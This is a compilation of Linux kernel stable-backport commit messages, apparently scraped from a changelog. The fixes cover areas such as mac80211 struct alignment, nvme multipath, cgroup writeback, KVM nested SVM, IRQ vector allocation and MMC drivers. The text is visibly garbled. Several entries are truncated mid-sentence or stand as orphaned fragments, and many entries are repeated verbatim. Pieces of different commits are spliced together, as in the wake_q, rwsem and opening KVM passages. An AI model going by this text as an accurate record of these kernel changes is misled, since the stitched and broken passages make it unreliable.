decide to reflect EXIT\_NPF to L1. The flag remains pending and we do NMI
injection upon entry so it got delivered to L1 instead of L2.
It seems that VMX code solves the same issue in prepare\_vmcs12(), this was

During refactor in commit 9e478066eae4 ("mac80211: fix MU-MIMO

attribute as:
struct {
struct ieee80211\_hdr\_3addr hdr;
u8 category;
u8 action\_code;
} \_\_packed action;
But since struct 'ieee80211\_hdr\_3addr' is declared with an aligned
keyword as:
struct ieee80211\_hdr {
\_\_le16 frame\_control;
\_\_le16 duration\_id;
u8 addr1[ETH\_ALEN];
u8 addr2[ETH\_ALEN];
u8 addr3[ETH\_ALEN];
\_\_le16 seq\_ctrl;
u8 addr4[ETH\_ALEN];
} \_\_packed \_\_aligned(2);

adding the aligned(2) attribute to struct 'action'.
This removes the following warning (W=1):

drm/msm: Fix A6XX support for opp-level
[ Upstream commit a3c5e2cd79753121f49a8662c1e0a60ddb5486ca ]
The bindings for Qualcomm opp levels changed after being Acked but
before landing. Thus the code in the GPU driver that was relying on
the old bindings is now broken.
Let's change the code to match the new bindings by adjusting the old
string 'qcom,level' to the new string 'opp-level'. See the patch
("dt-bindings: opp: Introduce opp-level bindings").
NOTE: we will do additional cleanup to totally remove the string from
the code and use the new dev\_pm\_opp\_get\_level() but we'll do it in a
future patch. This will facilitate getting the important code fix in
sooner without having to deal with cross-maintainer dependencies.
This patch needs to land before the patch ("arm64: dts: sdm845: Add
gpu and gmu device nodes") since if a tree contains the device tree
patch but not this one you'll get a crash at bootup.

nvme-multipath: drop optimization for static ANA group IDs
[ Upstream commit 78a61cd42a64f3587862b372a79e1d6aaf131fd7 ]
Bit 6 in the ANACAP field is used to indicate that the ANA group ID
doesn't change while the namespace is attached to the controller.
There is an optimisation in the code to only allocate space
for the ANA group header, as the namespace list won't change and
hence would not need to be refreshed.
However, this optimisation was never carried over to the actual
workflow, which always assumes that the buffer is large enough
to hold the ANA header \_and\_ the namespace list.
So drop this optimisation and always allocate enough space.

nvme-rdma: fix timeout handler
[ Upstream commit 4c174e6366746ae8d49f9cc409f728eebb7a9ac9 ]
Currently, we have several problems with the timeout
handler:
1. If we timeout on the controller establishment flow, we will hang
because we don't execute the error recovery (and we shouldn't because
the create\_ctrl flow needs to fail and cleanup on its own)
2. We might also hang if we get a disconnet on a queue while the
controller is already deleting. This racy flow can cause the controller
disable/shutdown admin command to hang.
We cannot complete a timed out request from the timeout handler without
mutual exclusion from the teardown flow (e.g. nvme\_rdma\_error\_recovery\_work).
So we serialize it in the timeout handler and teardown io and admin
queues to guarantee that no one races with us from completing the
request.

writeback: synchronize sync(2) against cgroup writeback membership switches
[ Upstream commit 7fc5854f8c6efae9e7624970ab49a1eac2faefb1 ]
sync\_inodes\_sb() can race against cgwb (cgroup writeback) membership
switches and fail to writeback some inodes. For example, if an inode
switches to another wb while sync\_inodes\_sb() is in progress, the new
wb might not be visible to bdi\_split\_work\_to\_wbs() at all or the inode
might jump from a wb which hasn't issued writebacks yet to one which
already has.
This patch adds backing\_dev\_info->wb\_switch\_rwsem to synchronize cgwb
switch path against sync\_inodes\_sb() so that sync\_inodes\_sb() is
guaranteed to see all the target wbs and inodes can't jump wbs to
escape syncing.

direct-io: allow direct writes to empty inodes
[ Upstream commit 8b9433eb4de3c26a9226c981c283f9f4896ae030 ]
On a DIO\_SKIP\_HOLES filesystem, the ->get\_block() method is currently
not allowed to create blocks for an empty inode. This confusion comes
from trying to bit shift a negative number, so check the size of the
inode first.
The problem is most visible for hfsplus, because the fallback to
buffered I/O doesn't happen and the write fails with EIO. This is in
part the fault of the module, because it gives a wrong return value on
->get\_block(); that will be fixed in a separate patch.

sched/wake\_q: Fix wakeup ordering for wake\_q

Notable cmpxchg() does not provide ordering when it fails, however
wake\_q\_add() requires ordering in this specific case too. Without this
it would be possible for the concurrent wakeup to not observe our

mac80211: fix miscounting of ttl-dropped frames
[ Upstream commit a0dc02039a2ee54fb4ae400e0b755ed30e73e58c ]
In ieee80211\_rx\_h\_mesh\_fwding, we increment the 'dropped\_frames\_ttl'
counter when we decrement the ttl to zero. For unicast frames
destined for other hosts, we stop processing the frame at that point.
For multicast frames, we do not rebroadcast it in this case, but we
do pass the frame up the stack to process it on this STA. That
doesn't match the usual definition of "dropped," so don't count
those as such.
With this change, something like `ping6 -i0.2 ff02::1%mesh0` from a
peer in a ttl=1 network no longer increments the counter rapidly.

staging: rtl8723bs: Fix build error with Clang when inlining is disabled
[ Upstream commit 97715058b70da1262fd07798c8b2e3e894f759dd ]
When CONFIG\_NO\_AUTO\_INLINE was present in linux-next (which added
'-fno-inline-functions' to KBUILD\_CFLAGS), an allyesconfig build with
Clang failed at the modpost stage:
ERROR: "is\_broadcast\_mac\_addr" [drivers/staging/rtl8723bs/r8723bs.ko] undefined!
ERROR: "is\_zero\_mac\_addr" [drivers/staging/rtl8723bs/r8723bs.ko] undefined!
ERROR: "is\_multicast\_mac\_addr" [drivers/staging/rtl8723bs/r8723bs.ko] undefined!
These functions were marked as extern inline, meaning that if inlining
doesn't happen, the function will be undefined, as it is above.
This happens to work with GCC because the '-fno-inline-functions' option
respects the \_\_inline attribute so all instances of these functions are
inlined as expected and the definition doesn't actually matter. However,
with Clang and '-fno-inline-functions', a function has to be marked with
the \_\_always\_inline attribute to be considered for inlining, which none
of these functions are. Clang tries to find the symbol definition
elsewhere as it was told and fails, which trickles down to modpost.
To make sure that this code compiles regardless of compiler and make the
intention of the code clearer, use 'static' to ensure these functions
are always defined, regardless of inlining. Additionally, silence a
checkpatch warning by switching from '\_\_inline' to 'inline'.

drivers: thermal: int340x\_thermal: Fix sysfs race condition
[ Upstream commit 129699bb8c7572106b5bbb2407c2daee4727ccad ]
Changes since V1:
\* Use dev\_info instead of printk
\* Use dev\_warn instead of BUG\_ON
Previously, sysfs\_create\_group was called before all initialization had
fully run - specifically, before pci\_set\_drvdata was called. Since the
sysctl group is visible to userspace as soon as sysfs\_create\_group
returns, a small window of time existed during which a process could read
from an uninitialized/partially-initialized device.
This commit moves the creation of the sysctl group to after all
initialized is completed. This ensures that it's impossible for
userspace to read from a sysctl file before initialization has fully
completed.
To catch any future regressions, I've added a check to ensure
that proc\_thermal\_emum\_mode is never PROC\_THERMAL\_NONE when a process
tries to read from a sysctl file. Previously, the aforementioned race
condition could result in the 'else' branch
running while PROC\_THERMAL\_NONE was set,
leading to a null pointer deference.

The motivation for this change was lockdep splat like below.
| potentially unexpected fatal signal 11.
| BUG: sleeping function called from invalid context at ../mm/page\_alloc.c:4317
| in\_atomic(): 1, irqs\_disabled(): 0, pid: 57, name: segv
| no locks held by segv/57.

| do\_signal+0x30/0x224
| resume\_user\_mode\_begin+0x90/0xd8
So signal handling core calls show\_regs() with preemption disabled but
an ensuing GFP\_KERNEL page allocator call is flagged by lockdep.
We could have switched to GFP\_NOWAIT, but turns out that is not enough
anways and eliding page allocator call leads to less code and
instruction traces to sift thru when debugging pesky crashes.
FWIW, this patch doesn't cure the lockdep splat (which next patch does).

It's GNU Make and linker specific.
The default Makefile rule looks like:
$(CC) $(CFLAGS) $(LDFLAGS) $@ $^ $(LDLIBS)
When linking is done by gcc itself, no issue, but when it needs to be passed
to proper ld, only LDLIBS follows and then ld cannot know what libs to link
with.
More detail:
https://www.gnu.org/software/make/manual/html\_node/Implicit-Variables.html
LDFLAGS
Extra flags to give to compilers when they are supposed to invoke the linker,
‘ld’, such as -L. Libraries (-lfoo) should be added to the LDLIBS variable
instead.
LDLIBS
Library flags or names given to compilers when they are supposed to invoke the
linker, ‘ld’. LOADLIBES is a deprecated (but still supported) alternative to
LDLIBS. Non-library linker flags, such as -L, should go in the LDFLAGS
variable.
https://lkml.org/lkml/2010/2/10/362
tools/perf: libraries must come after objects
Link order matters, use LDLIBS instead of LDFLAGS to properly link against
libpthread.

phy: ath79-usb: Fix the main reset name to match the DT binding
[ Upstream commit 827cb0323928952c0db9515aba9d534fb1285b3f ]
I submitted this driver several times before it got accepted. The
first series hasn't been accepted but the DTS binding did made it.
I then made a second series that added generic reset support to the
PHY core, this in turn required a change to the DT binding. This
second series seemed to have been ignored, so I did a third one
without the change to the PHY core and the DT binding update, and this
last attempt finally made it.
But two months later the DT binding update from the second series has
been integrated too. So now the driver doesn't match the binding and
the only DTS using it. This patch fix the driver to match the new
binding.

ASoC: imx-audmux: change snprintf to scnprintf for possible overflow
[ Upstream commit c407cd008fd039320d147088b52d0fa34ed3ddcb ]
Change snprintf to scnprintf. There are generally two cases where using
snprintf causes problems.
1) Uses of size += snprintf(buf, SIZE - size, fmt, ...)
In this case, if snprintf would have written more characters than what the
buffer size (SIZE) is, then size will end up larger than SIZE. In later
uses of snprintf, SIZE - size will result in a negative number, leading
to problems. Note that size might already be too large by using
size = snprintf before the code reaches a case of size += snprintf.
2) If size is ultimately used as a length parameter for a copy back to user
space, then it will potentially allow for a buffer overflow and information
disclosure when size is greater than SIZE. When the size is used to index
the buffer directly, we can have memory corruption. This also means when
size = snprintf... is used, it may also cause problems since size may become
large. Copying to userspace is mitigated by the HARDENED\_USERCOPY kernel
configuration.
The solution to these issues is to use scnprintf which returns the number of
characters actually written to the buffer, so the size variable will never
exceed SIZE.

x86/mm/mem\_encrypt: Fix erroneous sizeof()
[ Upstream commit bf7d28c53453ea904584960de55e33e03b9d93b1 ]
Using sizeof(pointer) for determining the size of a memset() only works
when the size of the pointer and the size of type to which it points are
the same. For pte\_t this is only true for 64bit and 32bit-NONPAE. On 32bit
PAE systems this is wrong as the pointer size is 4 byte but the PTE entry
is 8 bytes. It's actually not a real world issue as this code depends on
64bit, but it's wrong nevertheless.
Use sizeof(\*p) for correctness sake.

The source\_sink\_alloc\_func() function is supposed to return error

doesn't check for NULL returns so it would result in an Oops.
Of course, in the current kernel, small allocations always succeed so

ALSA: compress: prevent potential divide by zero bugs
[ Upstream commit 678e2b44c8e3fec3afc7202f1996a4500a50be93 ]
The problem is seen in the q6asm\_dai\_compr\_set\_params() function:
ret = q6asm\_map\_memory\_regions(dir, prtd->audio\_client, prtd->phys,
(prtd->pcm\_size / prtd->periods),
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
prtd->periods);
In this code prtd->pcm\_size is the buffer\_size and prtd->periods comes
from params->buffer.fragments. If we allow the number of fragments to
be zero then it results in a divide by zero bug. One possible fix would
be to use prtd->pcm\_count directly instead of using the division to
re-calculate it. But I decided that it doesn't really make sense to
allow zero fragments.

scsi: libsas: Fix rphy phy\_identifier for PHYs with end devices attached
commit ffeafdd2bf0b280d67ec1a47ea6287910d271f3f upstream.
The sysfs phy\_identifier attribute for a sas\_end\_device comes from the rphy
phy\_identifier value.
Currently this is not being set for rphys with an end device attached, so
we see incorrect symlinks from systemd disk/by-path:
root@localhost:~# ls -l /dev/disk/by-path/
total 0
lrwxrwxrwx 1 root root 9 Feb 13 12:26 platform-HISI0162:01-sas-exp0x500e004aaaaaaa1f-phy0-lun-0 -> ../../sdb

Indeed, each sas\_end\_device phy\_identifier value is 0:
root@localhost:/# more sys/class/sas\_device/end\_device-0\:0\:2/phy\_identifier
0
root@localhost:/# more sys/class/sas\_device/end\_device-0\:0\:10/phy\_identifier
0
This patch fixes the discovery code to set the phy\_identifier. With this,
we now get proper symlinks:
root@localhost:~# ls -l /dev/disk/by-path/
total 0

mac80211: Change default tx\_sk\_pacing\_shift to 7
commit 5c14a4d05f68415af9e41a4e667d1748d41d1baf upstream.
When we did the original tests for the optimal value of sk\_pacing\_shift, we
came up with 6 ms of buffering as the default. Sadly, 6 is not a power of
two, so when picking the shift value I erred on the size of less buffering
and picked 4 ms instead of 8. This was probably wrong; those 2 ms of extra
buffering makes a larger difference than I thought.
So, change the default pacing shift to 7, which corresponds to 8 ms of
buffering. The point of diminishing returns really kicks in after 8 ms, and
so having this as a default should cut down on the need for extensive
per-device testing and overrides needed in the drivers.

genirq/matrix: Improve target CPU selection for managed interrupts.
[ Upstream commit e8da8794a7fd9eef1ec9a07f0d4897c68581c72b ]
On large systems with multiple devices of the same class (e.g. NVMe disks,
using managed interrupts), the kernel can affinitize these interrupts to a
small subset of CPUs instead of spreading them out evenly.
irq\_matrix\_alloc\_managed() tries to select the CPU in the supplied cpumask
of possible target CPUs which has the lowest number of interrupt vectors
allocated.
This is done by searching the CPU with the highest number of available
vectors. While this is correct for non-managed CPUs it can select the wrong
CPU for managed interrupts. Under certain constellations this results in
affinitizing the managed interrupts of several devices to a single CPU in
a set.
The book keeping of available vectors works the following way:
1) Non-managed interrupts:
available is decremented when the interrupt is actually requested by
the device driver and a vector is assigned. It's incremented when the
interrupt and the vector are freed.
2) Managed interrupts:
Managed interrupts guarantee vector reservation when the MSI/MSI-X
functionality of a device is enabled, which is achieved by reserving
vectors in the bitmaps of the possible target CPUs. This reservation
decrements the available count on each possible target CPU.
When the interrupt is requested by the device driver then a vector is
allocated from the reserved region. The operation is reversed when the
interrupt is freed by the device driver. Neither of these operations
affect the available count.
The reservation persist up to the point where the MSI/MSI-X
functionality is disabled and only this operation increments the
available count again.
For non-managed interrupts the available count is the correct selection
criterion because the guaranteed reservations need to be taken into
account. Using the allocated counter could lead to a failing allocation in
the following situation (total vector space of 10 assumed):
CPU0 CPU1
available: 2 0
allocated: 5 3 <--- CPU1 is selected, but available space = 0
managed reserved: 3 7
while available yields the correct result.
For managed interrupts the available count is not the appropriate
selection criterion because as explained above the available count is not
affected by the actual vector allocation.
The following example illustrates that. Total vector space of 10
assumed. The starting point is:
CPU0 CPU1
available: 5 4
allocated: 2 3
managed reserved: 3 3
Allocating vectors for three non-managed interrupts will result in
affinitizing the first two to CPU0 and the third one to CPU1 because the
available count is adjusted with each allocation:
CPU0 CPU1
available: 5 4 <- Select CPU0 for 1st allocation
--> allocated: 3 3
available: 4 4 <- Select CPU0 for 2nd allocation
--> allocated: 4 3
available: 3 4 <- Select CPU1 for 3rd allocation
--> allocated: 4 4
But the allocation of three managed interrupts starting from the same
point will affinitize all of them to CPU0 because the available count is
not affected by the allocation (see above). So the end result is:
CPU0 CPU1
available: 5 4
allocated: 5 3
Introduce a "managed\_allocated" field in struct cpumap to track the vector
allocation for managed interrupts separately. Use this information to
select the target CPU when a vector is allocated for a managed interrupt,
which results in more evenly distributed vector assignments. The above
example results in the following allocations:
CPU0 CPU1
managed\_allocated: 0 0 <- Select CPU0 for 1st allocation
--> allocated: 3 3
managed\_allocated: 1 0 <- Select CPU1 for 2nd allocation
--> allocated: 3 4
managed\_allocated: 1 1 <- Select CPU0 for 3rd allocation
--> allocated: 4 4
The allocation of non-managed interrupts is not affected by this change and
is still evaluating the available count.
The overall distribution of interrupt vectors for both types of interrupts
might still not be perfectly even depending on the number of non-managed
and managed interrupts in a system, but due to the reservation guarantee
for managed interrupts this cannot be avoided.
Expose the new field in debugfs as well.

irq/matrix: Spread managed interrupts on allocation
[ Upstream commit 76f99ae5b54d48430d1f0c5512a84da0ff9761e0 ]
Linux spreads out the non managed interrupt across the possible target CPUs
to avoid vector space exhaustion.
Managed interrupts are treated differently, as for them the vectors are
reserved (with guarantee) when the interrupt descriptors are initialized.
When the interrupt is requested a real vector is assigned. The assignment
logic uses the first CPU in the affinity mask for assignment. If the
interrupt has more than one CPU in the affinity mask, which happens when a
multi queue device has less queues than CPUs, then doing the same search as
for non managed interrupts makes sense as it puts the interrupt on the
least interrupt plagued CPU. For single CPU affine vectors that's obviously
a NOOP.
Restructre the matrix allocation code so it does the 'best CPU' search, add
the sanity check for an empty affinity mask and adapt the call site in the
x86 vector management code.

x86/uaccess: Don't leak the AC flag into \_\_put\_user() value evaluation
commit 2a418cf3f5f1caf911af288e978d61c9844b0695 upstream.
When calling \_\_put\_user(foo(), ptr), the \_\_put\_user() macro would call
foo() in between \_\_uaccess\_begin() and \_\_uaccess\_end(). If that code
were buggy, then those bugs would be run without SMAP protection.
Fortunately, there seem to be few instances of the problem in the
kernel. Nevertheless, \_\_put\_user() should be fixed to avoid doing this.
Therefore, evaluate \_\_put\_user()'s argument before setting AC.
This issue was noticed when an objtool hack by Peter Zijlstra complained
about genregs\_get() and I compared the assembly output to the C source.

MIPS: eBPF: Fix icache flush end address
commit d1a2930d8a992fb6ac2529449f81a0056e1b98d1 upstream.
The MIPS eBPF JIT calls flush\_icache\_range() in order to ensure the
icache observes the code that we just wrote. Unfortunately it gets the
end address calculation wrong due to some bad pointer arithmetic.
The struct jit\_ctx target field is of type pointer to u32, and as such
adding one to it will increment the address being pointed to by 4 bytes.
Therefore in order to find the address of the end of the code we simply
need to add the number of 4 byte instructions emitted, but we mistakenly
add the number of instructions multiplied by 4. This results in the call
to flush\_icache\_range() operating on a memory region 4x larger than
intended, which is always wasteful and can cause crashes if we overrun
into an unmapped page.
Fix this by correcting the pointer arithmetic to remove the bogus
multiplication, and use braces to remove the need for a set of brackets
whilst also making it obvious that the target field is a pointer.

\_\_cmpxchg\_small erroneously uses u8 for load comparison which can
be either char or short. This patch changes the local variable to
u32 which is sufficiently sized, as the loaded value is already
masked and shifted appropriately. Using an integer size avoids
any unnecessary canonicalization from use of non native widths.
This patch is part of a series that adapts the MIPS small word

mmc: tmio: fix access width of Block Count Register
commit 5603731a15ef9ca317c122cc8c959f1dee1798b4 upstream.
In R-Car Gen2 or later, the maximum number of transfer blocks are
changed from 0xFFFF to 0xFFFFFFFF. Therefore, Block Count Register
should use iowrite32().
If another system (U-boot, Hypervisor OS, etc) uses bit[31:16], this
value will not be cleared. So, SD/MMC card initialization fails.
So, check for the bigger register and use apropriate write. Also, mark
the register as extended on Gen2.

mmc: tmio\_mmc\_core: don't claim spurious interrupts
commit 5c27ff5db1491a947264d6d4e4cbe43ae6535bae upstream.
I have encountered an interrupt storm during the eMMC chip probing (and
the chip finally didn't get detected). It turned out that U-Boot left
the DMAC interrupts enabled while the Linux driver didn't use those.
The SDHI driver's interrupt handler somehow assumes that, even if an
SDIO interrupt didn't happen, it should return IRQ\_HANDLED. I think
that if none of the enabled interrupts happened and got handled, we
should return IRQ\_NONE -- that way the kernel IRQ code recoginizes
a spurious interrupt and masks it off pretty quickly...

mmc: spi: Fix card detection during probe
commit c9bd505dbd9d3dc80c496f88eafe70affdcf1ba6 upstream.
When using the mmc\_spi driver with a card-detect pin, I noticed that the
card was not detected immediately after probe, but only after it was
unplugged and plugged back in (and the CD IRQ fired).
The call tree looks something like this:
mmc\_spi\_probe
mmc\_add\_host
mmc\_start\_host
\_mmc\_detect\_change
mmc\_schedule\_delayed\_work(&host->detect, 0)
mmc\_rescan
host->bus\_ops->detect(host)
mmc\_detect
\_mmc\_detect\_card\_removed
host->ops->get\_cd(host)
mmc\_gpio\_get\_cd -> -ENOSYS (ctx->cd\_gpio not set)
mmc\_gpiod\_request\_cd
ctx->cd\_gpio = desc
To fix this issue, call mmc\_detect\_change after the card-detect GPIO/IRQ
is registered.

powerpc: Always initialize input array when calling epapr\_hypercall()

Several callers to epapr\_hypercall() pass an uninitialized stack
allocated array for the input arguments, presumably because they
have no input arguments. However this can produce errors like
this one

KVM: nSVM: clear events pending from svm\_complete\_interrupts() when exiting to L1
[ Upstream commit 619ad846fc3452adaf71ca246c5aa711e2055398 ]
kvm-unit-tests' eventinj "NMI failing on IDT" test results in NMI being
delivered to the host (L1) when it's running nested. The problem seems to
be: svm\_complete\_interrupts() raises 'nmi\_injected' flag but later we
decide to reflect EXIT\_NPF to L1. The flag remains pending and we do NMI
injection upon entry so it got delivered to L1 instead of L2.
It seems that VMX code solves the same issue in prepare\_vmcs12(), this was
introduced with code refactoring in commit 5f3d5799974b ("KVM: nVMX: Rework

mac80211: Add attribute aligned(2) to struct 'action'
[ Upstream commit 7c53eb5d87bc21464da4268c3c0c47457b6d9c9b ]
During refactor in commit 9e478066eae4 ("mac80211: fix MU-MIMO
follow-MAC mode") a new struct 'action' was declared with packed
attribute as:
struct {
struct ieee80211\_hdr\_3addr hdr;
u8 category;
u8 action\_code;
} \_\_packed action;
But since struct 'ieee80211\_hdr\_3addr' is declared with an aligned
keyword as:
struct ieee80211\_hdr {
\_\_le16 frame\_control;
\_\_le16 duration\_id;
u8 addr1[ETH\_ALEN];
u8 addr2[ETH\_ALEN];
u8 addr3[ETH\_ALEN];
\_\_le16 seq\_ctrl;
u8 addr4[ETH\_ALEN];
} \_\_packed \_\_aligned(2);
Solve the ambiguity of placing aligned structure in a packed one by
adding the aligned(2) attribute to struct 'action'.
This removes the following warning (W=1):
net/mac80211/rx.c:234:2: warning: alignment 1 of 'struct ' is less than 2 [-Wpacked-not-aligned]

writeback: synchronize sync(2) against cgroup writeback membership switches
[ Upstream commit 7fc5854f8c6efae9e7624970ab49a1eac2faefb1 ]
sync\_inodes\_sb() can race against cgwb (cgroup writeback) membership
switches and fail to writeback some inodes. For example, if an inode
switches to another wb while sync\_inodes\_sb() is in progress, the new
wb might not be visible to bdi\_split\_work\_to\_wbs() at all or the inode
might jump from a wb which hasn't issued writebacks yet to one which
already has.
This patch adds backing\_dev\_info->wb\_switch\_rwsem to synchronize cgwb
switch path against sync\_inodes\_sb() so that sync\_inodes\_sb() is
guaranteed to see all the target wbs and inodes can't jump wbs to
escape syncing.

direct-io: allow direct writes to empty inodes
[ Upstream commit 8b9433eb4de3c26a9226c981c283f9f4896ae030 ]
On a DIO\_SKIP\_HOLES filesystem, the ->get\_block() method is currently
not allowed to create blocks for an empty inode. This confusion comes
from trying to bit shift a negative number, so check the size of the
inode first.
The problem is most visible for hfsplus, because the fallback to
buffered I/O doesn't happen and the write fails with EIO. This is in
part the fault of the module, because it gives a wrong return value on
->get\_block(); that will be fixed in a separate patch.

case), we must not rely on the wakeup being delayed. However, commit:
e38513905eea ("locking/rwsem: Rework zeroing reader waiter->task")
relies on exactly that behaviour in that the wakeup must not happen
until after we clear waiter->task.

futex: Fix (possible) missed wakeup
[ Upstream commit b061c38bef43406df8e73c5be06cbfacad5ee6ad ]
We must not rely on wake\_q\_add() to delay the wakeup; in particular
commit:
1d0dcb3ad9d3 ("futex: Implement lockless wakeups")
moved wake\_q\_add() before smp\_store\_release(&q->lock\_ptr, NULL), which
could result in futex\_wait() waking before observing ->lock\_ptr ==
NULL and going back to sleep again.

sched/wait: Fix rcuwait\_wake\_up() ordering
[ Upstream commit 6dc080eeb2ba01973bfff0d79844d7a59e12542e ]
For some peculiar reason rcuwait\_wake\_up() has the right barrier in
the comment, but not in the code.
This mistake has been observed to cause a deadlock in the following
situation:
P1 P2
percpu\_up\_read() percpu\_down\_write()
rcu\_sync\_is\_idle() // false
rcu\_sync\_enter()
...
\_\_percpu\_up\_read()
[S] ,- \_\_this\_cpu\_dec(\*sem->read\_count)
| smp\_rmb();
[L] | task = rcu\_dereference(w->task) // NULL
|
| [S] w->task = current
| smp\_mb();
| [L] readers\_active\_check() // fail
`->
Where the smp\_rmb() (obviously) fails to constrain the store.

mac80211: fix miscounting of ttl-dropped frames
[ Upstream commit a0dc02039a2ee54fb4ae400e0b755ed30e73e58c ]
In ieee80211\_rx\_h\_mesh\_fwding, we increment the 'dropped\_frames\_ttl'
counter when we decrement the ttl to zero. For unicast frames
destined for other hosts, we stop processing the frame at that point.
For multicast frames, we do not rebroadcast it in this case, but we
do pass the frame up the stack to process it on this STA. That
doesn't match the usual definition of "dropped," so don't count
those as such.
With this change, something like `ping6 -i0.2 ff02::1%mesh0` from a
peer in a ttl=1 network no longer increments the counter rapidly.

staging: rtl8723bs: Fix build error with Clang when inlining is disabled
[ Upstream commit 97715058b70da1262fd07798c8b2e3e894f759dd ]
When CONFIG\_NO\_AUTO\_INLINE was present in linux-next (which added
'-fno-inline-functions' to KBUILD\_CFLAGS), an allyesconfig build with
Clang failed at the modpost stage:
ERROR: "is\_broadcast\_mac\_addr" [drivers/staging/rtl8723bs/r8723bs.ko] undefined!
ERROR: "is\_zero\_mac\_addr" [drivers/staging/rtl8723bs/r8723bs.ko] undefined!
ERROR: "is\_multicast\_mac\_addr" [drivers/staging/rtl8723bs/r8723bs.ko] undefined!
These functions were marked as extern inline, meaning that if inlining
doesn't happen, the function will be undefined, as it is above.
This happens to work with GCC because the '-fno-inline-functions' option
respects the \_\_inline attribute so all instances of these functions are
inlined as expected and the definition doesn't actually matter. However,
with Clang and '-fno-inline-functions', a function has to be marked with
the \_\_always\_inline attribute to be considered for inlining, which none
of these functions are. Clang tries to find the symbol definition
elsewhere as it was told and fails, which trickles down to modpost.
To make sure that this code compiles regardless of compiler and make the
intention of the code clearer, use 'static' to ensure these functions
are always defined, regardless of inlining. Additionally, silence a
checkpatch warning by switching from '\_\_inline' to 'inline'.

drivers: thermal: int340x\_thermal: Fix sysfs race condition
[ Upstream commit 129699bb8c7572106b5bbb2407c2daee4727ccad ]
Changes since V1:
\* Use dev\_info instead of printk
\* Use dev\_warn instead of BUG\_ON
Previously, sysfs\_create\_group was called before all initialization had
fully run - specifically, before pci\_set\_drvdata was called. Since the
sysctl group is visible to userspace as soon as sysfs\_create\_group
returns, a small window of time existed during which a process could read
from an uninitialized/partially-initialized device.
This commit moves the creation of the sysctl group to after all
initialized is completed. This ensures that it's impossible for
userspace to read from a sysctl file before initialization has fully
completed.
To catch any future regressions, I've added a check to ensure
that proc\_thermal\_emum\_mode is never PROC\_THERMAL\_NONE when a process
tries to read from a sysctl file. Previously, the aforementioned race
condition could result in the 'else' branch
running while PROC\_THERMAL\_NONE was set,
leading to a null pointer deference.

It's GNU Make and linker specific.
The default Makefile rule looks like:
$(CC) $(CFLAGS) $(LDFLAGS) $@ $^ $(LDLIBS)
When linking is done by gcc itself, no issue, but when it needs to be passed
to proper ld, only LDLIBS follows and then ld cannot know what libs to link
with.
More detail:
https://www.gnu.org/software/make/manual/html\_node/Implicit-Variables.html
LDFLAGS
Extra flags to give to compilers when they are supposed to invoke the linker,
‘ld’, such as -L. Libraries (-lfoo) should be added to the LDLIBS variable
instead.
LDLIBS
Library flags or names given to compilers when they are supposed to invoke the
linker, ‘ld’. LOADLIBES is a deprecated (but still supported) alternative to
LDLIBS. Non-library linker flags, such as -L, should go in the LDFLAGS
variable.
https://lkml.org/lkml/2010/2/10/362
tools/perf: libraries must come after objects
Link order matters, use LDLIBS instead of LDFLAGS to properly link against
libpthread.

ASoC: imx-audmux: change snprintf to scnprintf for possible overflow
[ Upstream commit c407cd008fd039320d147088b52d0fa34ed3ddcb ]
Change snprintf to scnprintf. There are generally two cases where using
snprintf causes problems.
1) Uses of size += snprintf(buf, SIZE - size, fmt, ...)
In this case, if snprintf would have written more characters than what the
buffer size (SIZE) is, then size will end up larger than SIZE. In later
uses of snprintf, SIZE - size will result in a negative number, leading
to problems. Note that size might already be too large by using
size = snprintf before the code reaches a case of size += snprintf.
2) If size is ultimately used as a length parameter for a copy back to user
space, then it will potentially allow for a buffer overflow and information
disclosure when size is greater than SIZE. When the size is used to index
the buffer directly, we can have memory corruption. This also means when
size = snprintf... is used, it may also cause problems since size may become
large. Copying to userspace is mitigated by the HARDENED\_USERCOPY kernel
configuration.
The solution to these issues is to use scnprintf which returns the number of
characters actually written to the buffer, so the size variable will never
exceed SIZE.

usb: gadget: Potential NULL dereference on allocation error
[ Upstream commit df28169e1538e4a8bcd8b779b043e5aa6524545c ]
The source\_sink\_alloc\_func() function is supposed to return error
pointers on error. The function is called from usb\_get\_function() which
doesn't check for NULL returns so it would result in an Oops.
Of course, in the current kernel, small allocations always succeed so
this doesn't affect runtime.

usb: dwc3: gadget: Fix the uninitialized link\_state when udc starts

Currently the link\_state is uninitialized and the default value is 0(U0)

stop the udc, the link\_state will be undefined.

clk: vc5: Abort clock configuration without upstream clock
[ Upstream commit 2137a109a5e39c2bdccfffe65230ed3fadbaac0e ]
In case the upstream clock are not set, which can happen in case the
VC5 has no valid upstream clock, the $src variable is used uninited
by regmap\_update\_bits(). Check for this condition and return -EINVAL
in such case.
Note that in case the VC5 has no valid upstream clock, the VC5 can
not operate correctly. That is a hardware property of the VC5. The
internal oscilator present in some VC5 models is also considered
upstream clock.

ALSA: compress: prevent potential divide by zero bugs
[ Upstream commit 678e2b44c8e3fec3afc7202f1996a4500a50be93 ]
The problem is seen in the q6asm\_dai\_compr\_set\_params() function:
ret = q6asm\_map\_memory\_regions(dir, prtd->audio\_client, prtd->phys,
(prtd->pcm\_size / prtd->periods),
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
prtd->periods);
In this code prtd->pcm\_size is the buffer\_size and prtd->periods comes
from params->buffer.fragments. If we allow the number of fragments to
be zero then it results in a divide by zero bug. One possible fix would
be to use prtd->pcm\_count directly instead of using the division to
re-calculate it. But I decided that it doesn't really make sense to
allow zero fragments.

scsi: libsas: Fix rphy phy\_identifier for PHYs with end devices attached
commit ffeafdd2bf0b280d67ec1a47ea6287910d271f3f upstream.
The sysfs phy\_identifier attribute for a sas\_end\_device comes from the rphy
phy\_identifier value.
Currently this is not being set for rphys with an end device attached, so
we see incorrect symlinks from systemd disk/by-path:
root@localhost:~# ls -l /dev/disk/by-path/
total 0
lrwxrwxrwx 1 root root 9 Feb 13 12:26 platform-HISI0162:01-sas-exp0x500e004aaaaaaa1f-phy0-lun-0 -> ../../sdb

Indeed, each sas\_end\_device phy\_identifier value is 0:
root@localhost:/# more sys/class/sas\_device/end\_device-0\:0\:2/phy\_identifier
0
root@localhost:/# more sys/class/sas\_device/end\_device-0\:0\:10/phy\_identifier
0
This patch fixes the discovery code to set the phy\_identifier. With this,
we now get proper symlinks:
root@localhost:~# ls -l /dev/disk/by-path/
total 0

ACS Feature is currently enabled for GMAC >= 4 but the llc\_snap status
is never checked in descriptor rx\_status callback. This will cause
stmmac to always strip packets even that ACS feature is already
stripping them.
Lets be safe and disable the ACS feature for GMAC >= 4 and always strip
the packets for this GMAC version.

net: stmmac: Fix reception of Broadcom switches tags
commit 8cad443eacf661796a740903a75cb8944c675b4e upstream.
